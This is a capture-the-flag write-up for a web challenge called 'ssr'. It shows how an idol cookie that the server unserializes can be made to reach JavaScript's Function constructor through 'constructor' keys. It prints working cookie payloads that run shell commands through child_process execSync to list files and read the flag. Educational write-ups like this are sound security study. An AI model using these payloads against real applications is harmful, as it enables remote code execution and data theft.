There are some actions of this site:

- Login
- Get new idol
- Let idol say something

When we get an idol, this site use cookie such as ``[{"key":["ssr","0"]}]`` to store it.

And when we access url like http://ssr.tasks.ctf.codeblue.jp/idols/0/say1, this cookie will unserialize as a ssr idol Uzuki then call Uzuki's ``say1`` function.

Try ``[{"key":["a","0"]}]`` will get an error

```
TypeError: Cannot read property '0' of undefined
    at generateIdol (/usr/local/ssr/build/server.js:144:49)
    at /usr/local/ssr/build/server.js:172:12
    at Array.map (<anonymous>)
    at unserializeIdols (/usr/local/ssr/build/server.js:169:20)
    at Idol.render (/usr/local/ssr/build/server.js:436:46)
    at /usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:793:21
    at measureLifeCyclePerf (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:73:12)
    at ReactCompositeComponentWrapper._renderValidatedComponentWithoutOwnerOrContext (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:792:25)
    at ReactCompositeComponentWrapper._renderValidatedComponent (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:819:32)
    at ReactCompositeComponentWrapper.performInitialMount (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:359:30)
```

In this chall, server side and client side share some code, so we can see functions related with idol generating:

```js
var unserializeIdols = exports.unserializeIdols = function unserializeIdols(idolsData) {
  if (!idolsData) {
    return [];
  }
  return idolsData.map(function(_ref) {
    var key = _ref.key;
    return generateIdol(key);
  });
};
```

```js
var idol = (0, _idols.unserializeIdols)(cookies.get('idols'))[id];
if (!idol) {
  return _react2.default.createElement(
    'div',
    null,
    'Invalid Idol!!'
  );
}

var idolAction = action || 'say1';
if (!idol[idolAction]) {
  return _react2.default.createElement(
    'div',
    null,
    'Invalid Action!!'
  );
}
```

```js
var generateIdol = function generateIdol(key) {
  var _key = _slicedToArray(key, 2),
      rarity = _key[0],
      idolNo = _key[1];

  var idolClass = _idolDatabase2.default[rarity][idolNo];
  return new idolClass(key);
};
```

With such code, when we pass a cookie such as ``[{"key":["ssr","0"]}]`` will execute:

```js
var idol = _idolDatabase2.default["ssr"]["0"];
return new idolClass(["ssr","0"]);
```

This remind me some magic JavaScript properties such as prototype/constructor will do something i want. When we pass a cookie like:

```[{"key":["constructor","constructor","0%3Breturn 1"]}]```

will execute

```js
var idolClass = _idolDatabase2.default["constructor"]["constructor"];
return new idolClass(["constructor","constructor","0;return '1'"]);
```

and generate a fucntion

```js
function(){constructor,constructor,0;return '1'}
```

Now we can generate an arbitrarily function, we can use this function by ``call`` method with visit url http://ssr.tasks.ctf.codeblue.jp/idols/0/call.

so let's list directory first, try

```
[{"key":["constructor","constructor","0%3Breturn process.mainModule.require('child_process').execSync('ls /usr/local/ssr/')+''"]}]
```

will return

```
README.md
build
conf
flag
gulpfile.js
node_modules
package-lock.json
package.json
public
src
style
webpack.config.js
```

and then cat flag with

```
[{"key":["constructor","constructor","0%3Breturn process.mainModule.require('child_process').execSync('cat /usr/local/ssr/flag')+''"]}]
```

got 

```
CBCTF{server_side_render1ng_1s_Soo_fun}
```